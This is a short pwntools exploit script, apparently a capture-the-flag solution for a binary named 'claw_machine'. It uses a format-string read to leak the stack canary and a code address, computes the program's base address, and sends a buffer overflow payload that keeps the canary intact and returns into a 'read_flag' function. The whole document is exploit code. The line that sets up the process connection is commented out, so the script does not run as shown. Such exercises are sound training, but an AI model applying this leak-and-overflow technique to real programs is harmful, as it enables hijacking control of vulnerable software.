from pwn import *
elf = context.binary = ELF('./claw_machine', checksec=False)
#context.terminal = ["alacritty",'-e','zsh','-c']
#p = gdb.debug("./claw_machine",gdbscript='''
    #break fb
    #continue
    #''')
#p = process(level='error')
#p = remote("IP", "PORT")
p.recvuntil(b">> ")
p.sendline(b'9')
p.recvuntil(b">> ")
p.sendline(b'y')
p.recvuntil(b': ')
p.sendline('%21$p %23$p'.encode())
print(p.recvline())
x = p.recvline().decode()
canary = x[x.index("k",20)+2:]
print(canary.split(" "))
print("HERE:")
elf.address = eval(canary.split(" ")[1].strip())-0x1552
print(elf.address)
p.recvline()
payload = flat(
    b'A'*72,
    eval(canary.split(" ")[0]),
    b"A"*8,
    elf.symbols.read_flag
)
p.send(payload)
p.recvline()
p.recvline()
p.recvline()
p.interactive()
